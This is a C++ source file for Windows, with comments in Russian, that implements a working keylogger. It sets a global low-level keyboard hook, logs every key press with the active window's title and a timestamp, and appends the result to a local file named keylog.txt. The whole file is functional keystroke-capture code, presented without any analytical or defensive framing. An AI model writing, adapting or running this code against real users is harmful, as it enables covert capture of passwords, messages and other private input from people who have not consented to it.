#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>

#pragma warning(disable:4996) 
#pragma warning(disable:4703) 

using namespace std;

int Save(int key);
LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook; // hendle for hook (идентификатор перехвата) 
KBDLLHOOKSTRUCT kbStruct; // получаем код нажатой кнопки
ofstream file; // куда записываем полученую инфу

char prevProg[256]; // имя перехватываемого окна

int Save(int key)
{
	
	if (key == 1 || key == 2)
		return 0;
	HWND foreground = GetForegroundWindow(); // получаем активное окно
	DWORD threadId; // Id процесса 
	HKL keyboardLayout; // для раскладки клавиатуры

	if (foreground)
	{
		threadId = GetWindowThreadProcessId(foreground, NULL); // получаем айди процесса
		keyboardLayout = GetKeyboardLayout(threadId); // получаем ракладку клавиатуры
		
		char currProg[256];	
		GetWindowText(foreground, currProg, 256); //получаем название окна

		if (strcmp(currProg, prevProg) != 0)
		{
			strcpy_s(prevProg, currProg);
			time_t t = time(NULL);
			struct tm *tm = localtime(&t);
			char c[64];
			strftime(c, sizeof(c), "%c", tm);

			file << "\n\n\n[Program: " << currProg << " DateTime: " << c << "]";

		}
		

	}

	cout << key << endl;

	switch (key)
	{
	case VK_BACK: file << "[BACKSPASE]";
		break;
	case VK_RETURN: file << "[ENTER]";
		break;
	case VK_TAB: file << "[TAB]";
		break;
	case VK_SHIFT: file << "[SHIFT]";
		break;
	case VK_LSHIFT: file << "[SHIFT]";
		break;
	case VK_RSHIFT: file << "[SHIFT]";
		break;
	case VK_CONTROL: file << "[CTRL]";
		break;
	case VK_LCONTROL: file << "[CTRL]";
		break;
	case VK_RCONTROL: file << "[CTRL]";
		break;
	case VK_ESCAPE: file << "[ESC]";
		break;
	case VK_END: file << "[END]";
		break;
	case VK_HOME: file << "[HOME]";
		break;
	case VK_LEFT: file << "[LEFT]";
		break;
	case VK_RIGHT: file << "[RIGHT]";
		break;
	case VK_UP: file << "[UP]";
		break;
	case VK_DOWN: file << "[DOWN]";
		break;
	case  110: file << ".";
		break;
	case 109: file << "-";
		break;
	case 20: file << "[CAPS]";
		break;
	default: {
		char currKey;	
		bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 ||
			(GetKeyState(VK_LSHIFT) & 0x0001) != 0 ||
			(GetKeyState(VK_RSHIFT) & 0x0001) != 0)
		{
			lower = !lower;
		}

		currKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboardLayout);

		if (!lower)
			currKey = tolower(currKey);
		file << char(currKey);
	}
		   break;
	}
	
	file.flush();
	return 0;
}

LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
			Save(kbStruct.vkCode);
		}
	}

	return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main()
{

	setlocale(LC_ALL, "rus");

	file.open("keylog.txt", ios_base::app);

	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);

	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack, NULL, 0)))
	{
		MessageBox(NULL,"Something is wrong!" , "Error" , MB_ICONERROR);
	}
	MSG message;

	while(true)
	{
		GetMessage(&message, NULL, 0, 0);
	}
}